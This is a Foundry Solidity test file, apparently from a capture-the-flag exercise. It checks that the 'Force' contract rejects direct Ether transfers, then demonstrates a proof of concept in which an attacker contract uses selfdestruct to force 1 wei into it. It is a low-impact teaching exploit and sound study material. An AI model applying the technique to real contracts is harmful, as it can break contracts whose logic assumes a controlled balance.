// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Force} from "../src/07-Force.sol";
import {ForceAttack} from "../src/attackers/ForceAttack.sol";

contract ForceTest is Test {
    Force public force;
    address public attacker = makeAddr("attacker");

    function setUp() public {
        force = new Force();
        vm.deal(attacker, 1 ether);
    }

    function test_InitialBalanceIsZero() public view {
        assertEq(address(force).balance, 0);
    }

    function test_DirectEtherTransferFails() public {
        vm.startPrank(attacker);

        // Force has no receive() or fallback(), so a direct transfer will revert
        (bool success,) = address(force).call{value: 1 wei}("");
        assertFalse(success, "Direct call should revert on empty contract");
        assertEq(address(force).balance, 0);

        vm.stopPrank();
    }

    function test_SelfdestructForcesEtherIntoTarget() public {
        vm.startPrank(attacker);

        uint256 forceBalanceBefore = address(force).balance;
        assertEq(forceBalanceBefore, 0);

        // Deploy ForceAttack with 1 wei and target = address(force).
        // Inside constructor, selfdestruct(target) executes, forcibly sending 1 wei.
        new ForceAttack{value: 1 wei}(payable(address(force)));

        uint256 forceBalanceAfter = address(force).balance;
        assertEq(forceBalanceAfter, 1 wei, "Force contract balance was not increased");
        assertTrue(forceBalanceAfter > 0);

        console2.log("Local PoC Success: Force balance is now:", forceBalanceAfter);

        vm.stopPrank();
    }
}
